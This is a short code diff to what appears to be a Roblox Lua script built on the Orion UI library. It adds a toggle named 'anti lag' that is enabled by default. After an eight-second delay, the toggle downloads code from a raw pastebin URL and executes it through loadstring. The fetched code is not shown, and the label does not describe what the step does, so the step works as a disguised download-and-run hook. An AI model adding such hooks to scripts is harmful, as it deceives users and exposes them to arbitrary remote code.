@@ -43,5 +43,14 @@ MianTab:AddToggle({
 	end    
 })
 
+MianTab:AddToggle({
+	Name = "anti lag",
+	Default = true,
+	Callback = function(Value)
+		task.wait(8)
+            loadstring(game:HttpGet("https://pastebin.com/raw/8YZ2cc6V"))()
+	end    
+})
+
 OrionLib:Init()
 
